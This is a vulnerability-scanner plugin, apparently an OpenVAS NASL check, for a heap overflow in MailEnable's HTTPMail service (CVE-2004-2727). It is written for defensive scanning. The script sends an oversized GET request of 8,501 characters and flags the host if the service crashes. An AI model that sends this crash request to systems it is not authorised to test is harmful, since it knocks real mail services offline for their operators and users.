# SPDX-FileCopyrightText: 2005 George A. Theall
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mailenable:mailenable";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14656");
  script_version("2025-01-31T15:39:24+0000");
  script_tag(name:"last_modification", value:"2025-01-31 15:39:24 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2004-2727");
  script_xref(name:"OSVDB", value:"6037");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MailEnable < 1.19 HTTPMail Service GET Overflow Vulnerability - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");
  script_dependencies("gb_mailenable_consolidation.nasl");
  script_mandatory_keys("mailenable/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"MailEnable is prone to a heap buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the service is
  still responding.");

  script_tag(name:"impact", value:"The flaw can be exploited by issuing an HTTP request exceeding
  4045 bytes (8500 if logging is disabled), which causes a heap buffer overflow, crashing the
  HTTPMail service and possibly allowing for arbitrary code execution.");

  script_tag(name:"solution", value:"Update to version 1.19 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/10312");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

# nb: Should be always before the first http_open_socket() call.
host = http_host_name(port: port);

if (!soc = http_open_socket(port))
  exit(0);

req = string(
  # assume logging is disabled.
  "GET /", crap(length: 8501, data: "X"), " HTTP/1.0\r\n",
  "Host: ", host, "\r\n",
  "\r\n" );

send(socket: soc, data: req);
res = http_recv(socket: soc);
http_close_socket(soc);

if (!res) {
  soc = http_open_socket(port);
  if (!soc) {
    security_message(port: port);
    exit(0);
  } else {
    http_close_socket(soc);
  }
}

exit(99);
